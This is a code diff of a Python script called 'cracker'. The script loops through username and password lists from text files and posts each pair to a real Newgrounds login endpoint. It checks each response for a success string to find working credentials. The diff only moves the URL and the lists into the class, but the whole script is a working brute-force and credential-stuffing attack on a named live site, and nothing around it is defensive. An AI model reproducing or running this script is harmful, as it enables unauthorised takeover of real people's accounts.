@@ -3,11 +3,11 @@ import requests
 from time import sleep
 import sys
 
-url = "https://www.newgrounds.com/passport/mode/iframe/appsession/7df01f8afbcb51e3648973c934c5fd324e2fc904b5b7f8"
-userList = open('users.txt', 'r').read().split('\n')
-pwList = open('pw.txt', 'r').read().split('\n')
-
 class cracker:
+
+	url = "https://www.newgrounds.com/passport/mode/iframe/appsession/7df01f8afbcb51e3648973c934c5fd324e2fc904b5b7f8"
+	userList = open('users.txt', 'r').read().split('\n')
+	pwList = open('pw.txt', 'r').read().split('\n')
 
 	def __init__(self, username, password):
 		self.username = username;
@@ -24,7 +24,7 @@ class cracker:
 		}
 		header_data = { }	
 
-		r = requests.post(url,data=form_data,headers=header_data)
+		r = requests.post(self.url,data=form_data,headers=header_data)
 		check = r.text.encode("utf-8").find("You have successfully")
 		return check
 
@@ -34,14 +34,11 @@ class cracker:
 		sys.exit()
 
 def main():
-	global url
-	global userList
-	global pwList
 
 	print "\n Cracker Activated \n"
 
-	for user in userList:
-		for pw in pwList:
+	for user in cracker.userList:
+		for pw in cracker.pwList:
 
 			print " %s:%s" % (user,pw)
 
@@ -52,5 +49,5 @@ def main():
 				pass
 			else:
 				start.cracked()
-				
+
 main()
